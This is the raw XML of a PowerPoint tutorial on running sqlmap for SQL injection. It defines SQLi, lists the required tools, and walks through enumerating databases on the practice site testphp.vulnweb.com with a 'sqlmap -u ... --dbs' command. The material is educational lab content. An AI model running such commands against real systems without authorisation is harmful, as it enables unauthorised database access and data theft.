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D713F9-4429-4220-B374-4A07EB3D1545}" v="55" dt="2025-12-03T14:04:52.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374F66-A57C-43BC-8DB9-FD5AAFA38116}"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4AEB843-9CF4-421C-9F98-BFC357C3BD1C}" type="slidenum">
              <a:rPr lang="en-IN" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-IN"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="769008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374F66-A57C-43BC-8DB9-FD5AAFA38116}"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937706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66374F66-A57C-43BC-8DB9-FD5AAFA38116}" type="datetimeFigureOut">
              <a:rPr lang="en-IN" smtClean="0"/>
              <a:t>03-12-2025</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IN"/>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IN"/>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4AEB843-9CF4-421C-9F98-BFC357C3BD1C}" type="slidenum">
              <a:rPr lang="en-IN" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-IN"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="149307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374F66-A57C-43BC-8DB9-FD5AAFA38116}"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2767441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374F66-A57C-43BC-8DB9-FD5AAFA38116}" type="datetimeFigureOut">
              <a:rPr lang="en-IN" smtClean="0"/>
              <a:t>03-12-2025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3245821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374F66-A57C-43BC-8DB9-FD5AAFA38116}" type="datetimeFigureOut">
              <a:rPr lang="en-IN" smtClean="0"/>
              <a:t>03-12-2025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1546382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374F66-A57C-43BC-8DB9-FD5AAFA38116}" type="datetimeFigureOut">
              <a:rPr lang="en-IN" smtClean="0"/>
              <a:t>03-12-2025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2633490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374F66-A57C-43BC-8DB9-FD5AAFA38116}" type="datetimeFigureOut">
              <a:rPr lang="en-IN" smtClean="0"/>
              <a:t>03-12-2025</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IN"/>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Slide Number Placeholder 6"/>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38103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374F66-A57C-43BC-8DB9-FD5AAFA38116}" type="datetimeFigureOut">
              <a:rPr lang="en-IN" smtClean="0"/>
              <a:t>03-12-2025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IN"/>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Slide Number Placeholder 6"/>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3370906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374F66-A57C-43BC-8DB9-FD5AAFA38116}"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1023384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374F66-A57C-43BC-8DB9-FD5AAFA38116}" type="datetimeFigureOut">
              <a:rPr lang="en-IN" smtClean="0"/>
              <a:t>03-12-2025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AEB843-9CF4-421C-9F98-BFC357C3BD1C}" type="slidenum">
              <a:rPr lang="en-IN" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-IN"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1108188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6374F66-A57C-43BC-8DB9-FD5AAFA38116}" type="datetimeFigureOut">
              <a:rPr lang="en-IN" smtClean="0"/>
              <a:t>03-12-2025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IN"/>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IN"/>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4AEB843-9CF4-421C-9F98-BFC357C3BD1C}" type="slidenum">
              <a:rPr lang="en-IN" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-IN"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="319757409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testphp.vulnweb.com/Listproducts.Php?Cat=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testphp.vulnweb.com/Listproducts.Php?Cat=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testphp.vulnweb.com/Listproducts.Php?Cat=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testphp.vulnweb.com/Listproducts.Php?Cat=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265A4-ACEC-D52F-3B76-3B71AD42D3F2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ctrTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3352801" y="1580536"/>
            <a:ext cx="5614218" cy="1310148"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" sz="6600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Bebas Neue Cyrillic"/>
                <a:ea typeface="Bebas Neue Cyrillic"/>
                <a:cs typeface="Bebas Neue Cyrillic"/>
                <a:sym typeface="Bebas Neue Cyrillic"/>
              </a:rPr>
              <a:t>SQLMAP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="6600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="63F1F9"/>
                </a:solidFill>
                <a:latin typeface="Bebas Neue Cyrillic"/>
                <a:ea typeface="Bebas Neue Cyrillic"/>
                <a:cs typeface="Bebas Neue Cyrillic"/>
                <a:sym typeface="Bebas Neue Cyrillic"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="4000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="TextBox 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A8D89078-3C68-6B3B-1A0A-DE46380E0386}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2113936" y="3213556"/>
            <a:ext cx="7964130" cy="430887"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr">
              <a:lnSpc>
                <a:spcPts val="2940"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" spc="1680" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="Open Sans"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Open Sans"/>
              </a:rPr>
              <a:t>SQL INJECTION ATTACK </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3622009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2CD69-DFF1-5DBD-964E-B84D8D9F18D0}"/>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id="{6102DB94-183D-25F6-CCA9-A98A0F01020F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1069848" y="1671484"/>
            <a:ext cx="10052304" cy="3873910"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="just">
              <a:lnSpc>
                <a:spcPts val="3236"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="Poppins Light"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Poppins Light"/>
              </a:rPr>
              <a:t>SQL Injection (SQLi) is a web vulnerability that allows attackers to manipulate database queries.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:lnSpc>
                <a:spcPts val="3236"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="Poppins Light"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Poppins Light"/>
              </a:rPr>
              <a:t>It can lead to unauthorized access, data leakage, or complete database compromise.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:lnSpc>
                <a:spcPts val="3236"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="Poppins Light"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Poppins Light"/>
              </a:rPr>
              <a:t>SQLMAP is an open-source tool designed to automate SQL Injection detection and exploitation.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:lnSpc>
                <a:spcPts val="3236"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="Poppins Light"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Poppins Light"/>
              </a:rPr>
              <a:t>It supports various databases (MySQL, Oracle, PostgreSQL, MSSQL, etc.).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="Poppins Light"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Poppins Light"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="Poppins Light"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Poppins Light"/>
              </a:rPr>
              <a:t>Provides advanced features like database dumping, privilege escalation, and command execution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15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77BD-57E9-D104-1A5C-080FD8197D4C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1063752" y="787072"/>
            <a:ext cx="9899216" cy="1334336"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-IN" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Purpose </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{046CF360-6E24-4369-793B-E2C02C0A5A79}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1069847" y="2121408"/>
            <a:ext cx="10394565" cy="3679624"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="3099"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="Poppins Light"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Poppins Light"/>
              </a:rPr>
              <a:t>To identify and exploit SQL Injection vulnerabilities in web applications.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="3099"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="Poppins Light"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Poppins Light"/>
              </a:rPr>
              <a:t>To automate the process of testing databases for security flaws.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="3099"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="Poppins Light"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Poppins Light"/>
              </a:rPr>
              <a:t>To simulate real-world attacks and understand their impact on sensitive data.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="3099"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="Poppins Light"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Poppins Light"/>
              </a:rPr>
              <a:t>To help security professionals and students learn SQLi exploitation techniques.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="3099"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="Poppins Light"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Poppins Light"/>
              </a:rPr>
              <a:t>To improve web application security by highlighting risks and encouraging secure coding practices.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1254234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50F0-A916-E0A7-3C4D-BEFE466871BD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Tools required </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E39E4EDE-CDD9-89D5-969F-61E75E83FDCD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1069848" y="2121408"/>
            <a:ext cx="10058400" cy="2263779"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="3236"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="Poppins Light"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Poppins Light"/>
              </a:rPr>
              <a:t>SQLMAP – The main tool for automated SQL Injection testing.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="3236"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="Poppins Light"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Poppins Light"/>
              </a:rPr>
              <a:t>Kali Linux / Linux environment – Platform to run SQLMAP.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="3236"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="Poppins Light"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Poppins Light"/>
              </a:rPr>
              <a:t>Target Application – </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="Poppins Light"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Poppins Light"/>
              </a:rPr>
              <a:t>Testphp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="Poppins Light"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Poppins Light"/>
              </a:rPr>
              <a:t> (Vulnerable web application for testing)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="3236"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="Poppins Light"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Poppins Light"/>
              </a:rPr>
              <a:t>Web Browser – Firefox (To interact with the target application.)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1860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3C65-6923-BE2F-6E48-B00643AB54F1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="831702" y="500674"/>
            <a:ext cx="10528594" cy="1280000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:lnSpc>
                <a:spcPts val="2484"/>
              </a:lnSpc>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" spc="289" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="HK Modular"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="HK Modular"/>
              </a:rPr>
              <a:t>Open fire fox in kali </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" spc="289" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="HK Modular"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="HK Modular"/>
              </a:rPr>
              <a:t>linux</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" spc="289" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="HK Modular"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="HK Modular"/>
              </a:rPr>
              <a:t> and search </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" spc="289" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="HK Modular"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="HK Modular"/>
              </a:rPr>
              <a:t>testphp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" spc="289" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="HK Modular"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="HK Modular"/>
              </a:rPr>
              <a:t> copy that </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" spc="289" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="HK Modular"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="HK Modular"/>
              </a:rPr>
              <a:t>url</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1800" spc="289" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="HK Modular"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="HK Modular"/>
              </a:rPr>
            </a:br>
            <a:br>
              <a:rPr lang="en-US" sz="1800" spc="289" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="HK Modular"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="HK Modular"/>
              </a:rPr>
            </a:b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descr="A screenshot of a computer&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9C284090-928B-3751-FD04-2ED2FA4063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2945" y="1515644"/>
            <a:ext cx="8586109" cy="4564313"/>
          </a:xfrm>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3163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858E-BD9A-7330-802B-8DAD98588A8F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1069848" y="484632"/>
            <a:ext cx="10058400" cy="1392294"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="3023"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" spc="352" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="HK Modular"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="HK Modular"/>
              </a:rPr>
              <a:t>•</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" cap="none" spc="352" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="HK Modular"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="HK Modular"/>
              </a:rPr>
              <a:t>Go To The Kali Lunix Open The Root Terminal.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1800" cap="none" spc="352" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="HK Modular"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="HK Modular"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1800" cap="none" spc="352" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="HK Modular"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="HK Modular"/>
              </a:rPr>
              <a:t>•GIVE THE COMMAND: </a:t>
            </a:r>
            <a:b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b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sqlmap -u </a:t>
            </a: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hlinkClick r:id="rId2">
                  <a:extLst>
                    <a:ext uri="{A12FA001-AC4F-418D-AE19-62706E023703}">
                      <ahyp:hlinkClr xmlns:ahyp="http://schemas.microsoft.com/office/drawing/2018/hyperlinkcolor" val="tx"/>
                    </a:ext>
                  </a:extLst>
                </a:hlinkClick>
              </a:rPr>
              <a:t>HTTP://TESTPHP.Vulnweb.Com/Listproducts.Php?Cat=1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" cap="none" spc="352" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="HK Modular"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="HK Modular"/>
              </a:rPr>
              <a:t>  </a:t>
            </a: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a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" cap="none" spc="352" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="HK Modular"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="HK Modular"/>
              </a:rPr>
              <a:t>dbs</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1800" spc="352" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
